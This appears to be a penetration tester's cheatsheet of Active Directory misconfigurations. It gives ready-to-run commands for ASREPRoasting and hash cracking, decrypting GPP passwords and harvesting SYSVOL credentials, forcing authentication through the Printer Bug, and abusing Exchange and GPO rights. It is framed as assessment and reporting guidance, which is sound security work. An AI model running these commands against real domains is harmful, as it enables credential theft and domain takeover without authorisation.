# AD Miscellaneous Misconfigurations Cheatsheet
*(Grab-bag of findings worth checking on every assessment — individually less flashy than ACL chains or DCSync, but extremely common and often the actual way in.)*

---

## 1. Exchange-Related Privilege Issues

A default Exchange install (no split-admin model) grants Exchange groups serious AD-wide rights:
- **`Exchange Windows Permissions`** — not a protected group, but members can write a DACL to the domain object. This can be escalated to grant DCSync rights. Reachable via a DACL misconfig or by compromising an **`Account Operators`** member.
- **`Organization Management`** — effectively "Domain Admins for Exchange." Full access to all mailboxes, and full control of the OU containing `Exchange Windows Permissions`.

**Compromising an Exchange server is a near-automatic path to Domain Admin.** Dumping LSASS on one typically yields dozens to hundreds of cached cleartext creds/hashes from OWA logins.

### PrivExchange
Pre-2019-CU Exchange installs run as SYSTEM with `WriteDacl` on the domain by default. The `PushSubscription` feature lets **any mailbox-holding domain user** force the Exchange server to authenticate to an attacker-controlled host over HTTP — relay that to LDAP, and any authenticated user goes straight to Domain Admin. Patched, but still worth checking Exchange CU level on an assessment.

---

## 2. Coercion / Legacy Protocol Abuse

### Printer Bug (MS-RPRN)
Any domain user can call `RpcOpenPrinter` + `RpcRemoteFindFirstPrinterChangeNotificationEx` on the spooler's named pipe to force the target (running as SYSTEM) to authenticate to an attacker-chosen host over SMB. Same coercion role as PetitPotam, but via the print spooler instead of EFSRPC — and **wasn't patched the same way**, so it's often still live where PetitPotam has been closed.

**Check for vulnerable hosts:**
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <target_FQDN>
```
Relay target: LDAP for DCSync rights, or for RBCD setup against a computer account you control (lets you authenticate as any user on the victim computer). Also useful cross-forest if the trust still allows TGT delegation (not default anymore) and you already hold admin in the first forest.

### MS14-068 (historical — patched since 2014)
Kerberos PAC forgery bug letting a standard user fake Domain Admin group membership in their own ticket. Essentially extinct on any patched environment at this point — flag it only as a "what if this box was never patched" check, not a realistic expectation. HTB's Mantis box is the canonical place to practice it if you want hands-on exposure.

---

## 3. Credential Harvesting Opportunities

### LDAP Credential Sniffing
Printers and appliances often store LDAP bind creds in their admin console for domain lookups, frequently with weak/default passwords, sometimes visible in cleartext. If there's a "test connection" feature, pointing the configured LDAP IP at your attack host + a netcat listener on port 389 can catch the creds in cleartext when it tests. A full fake LDAP server is sometimes needed for pickier implementations.

### DNS Record Enumeration
Any domain user can list DNS zone child objects by default, but normal LDAP queries for DNS records don't return everything — if your BloodHound host list is full of meaningless names (`SRV01934.domain.local`), hidden records can reveal what they actually are (`JENKINS.domain.local`, etc.).
```bash
adidnsdump -u <domain>\\<user> ldap://<DC_IP>
adidnsdump -u <domain>\\<user> ldap://<DC_IP> -r   # resolves unknown/blank records via A queries
```
Still actively maintained — no replacement needed.

### Password in Description/Notes Field
Classic, still common. Export to CSV for large domains rather than eyeballing in console.
```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

### PASSWD_NOTREQD Flag
Set in `userAccountControl` — means the account is exempt from the domain's minimum password length policy, **not necessarily that the password is blank**. Worth testing every hit, since blank passwords do occur (admin convenience, accidental enter-through on password change, vendor install default never cleaned up).
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
Include in the report even when a flagged account turns out to have a real password set — the flag itself is a finding.

### SYSVOL Scripts
Readable by all authenticated users by default. Worth manually digging through, not just keyword-grepping — old scripts sometimes hardcode local admin or service account passwords, even for since-disabled accounts (still worth a spray attempt for password reuse).
```powershell
ls \\<DC_hostname>\SYSVOL\<domain>\scripts
```

### Group Policy Preferences (GPP) Passwords
GPP XML files (`drives.xml`, `printers.xml`, `services.xml`, `scheduledtasks.xml`, local-admin-password-setting GPPs) store `cpassword` AES-256 encrypted — but Microsoft published the key publicly (MS14-025 patched *creating new* GPP passwords in 2014, but did **not** retroactively scrub existing `Groups.xml` files already sitting in SYSVOL, and deleting rather than unlinking a GPO leaves the cached local copy behind too).

```bash
gpp-decrypt <cpassword_value>
```
**Automated hunting:** `crackmapexec`/`netexec`'s `gpp_password` module finds and decrypts in one pass:
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' -M gpp_password
```
> `Get-GPPPassword.ps1` (PowerSploit) still works but is unmaintained — prefer the nxc module.

**GPP passwords often belong to legacy/deleted accounts** — but test the decrypted password in a spray regardless. Unique passwords tied to a naming convention are often reused elsewhere.

### Autologon Credentials (Registry.xml)
Separate from GPP-cpassword — autologon configured via Group Policy writes the account+password to `Registry.xml` on SYSVOL in **plain cleartext**, with no MS14-025-style key-exposure story needed; it was just never encrypted at all. Any authenticated user can read it.
```bash
nxc smb <DC_IP> -u <user> -p '<pass>' -M gpp_autologin
```

---

## 4. ASREPRoasting

**Concept:** accounts with `Do not require Kerberos pre-authentication` set let **any unauthenticated party** request their AS-REP, which is encrypted with the account's password — crackable offline, no domain access needed at all to pull the hash (just the target username).

**Enumerate (credentialed):**
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
```

**Attack — Rubeus (format ready for Hashcat):**
```powershell
.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat
```

**Attack — from Linux, no credentials needed, just a username list:**
```bash
GetNPUsers.py <domain>/ -dc-ip <DC_IP> -no-pass -usersfile valid_users.txt
```

**Attack — Kerbrute grabs AS-REP hashes automatically during user enumeration** (two birds, one scan):
```bash
kerbrute userenum -d <domain> --dc <DC_IP> /opt/jsmith.txt
```

**Crack offline:**
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**If you have GenericWrite/GenericAll over a target user, you can force this attack** even if `DONT_REQ_PREAUTH` isn't already set — flip the UAC bit, roast, then flip it back:
```powershell
Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Credential $Cred
# ... roast ...
Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Credential $Cred   # toggles back off
```

**Report even unsuccessful cracks** — a weaker finding than a cracked password, but still tells the client the account is exposed to offline attack and should have pre-auth re-enabled.

---

## 5. GPO Abuse

**Concept:** rights over a GPO (via ACL misconfig) propagate to every user/computer the GPO applies to — add local admins, run immediate scheduled tasks, or grant rights like `SeDebugPrivilege`/`SeImpersonatePrivilege` domain-wide across an OU.

**Enumerate GPOs:**
```powershell
Get-DomainGPO | select displayname
# or built-in (needs RSAT GroupPolicy module):
Get-GPO -All | Select DisplayName
```
GPO names themselves are informative — e.g. seeing `Certificate Services` confirms AD CS is in play; `AutoLogon` hints at a readable password somewhere in that policy.

**Check if a controlled user/group has rights over any GPO — start with `Domain Users` as a baseline check:**
```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
Look for `WriteProperty`/`WriteDacl`/`WriteOwner` in `ActiveDirectoryRights`.

**Resolve a GPO GUID to its display name:**
```powershell
Get-GPO -Guid <guid>
```

**Confirm blast radius before touching anything — check in BloodHound which OU(s)/hosts the GPO actually applies to.** A GPO with write access that's linked to a 1,000-computer OU is not something to casually test by adding yourself as local admin across the board.

**Exploitation tool:** `SharpGPOAbuse` — supports targeting a specific user/host rather than the whole linked OU, use that scoping wherever possible.

**Related tools for GPO security auditing generally (defensive side, worth knowing exists):** `group3r`, `ADRecon`, `PingCastle`.

---

## Quick-reference: what to always check, regardless of path to Domain Admin
- Exchange group memberships (`Exchange Windows Permissions`, `Organization Management`)
- `PASSWD_NOTREQD` accounts — test every one
- SYSVOL scripts + GPP `cpassword` + `Registry.xml` autologon — all three, every time
- ASREPRoastable accounts — zero-cost to check, zero domain access required
- `Domain Users` rights over any GPO — the one check that catches org-wide misconfigs in a single query
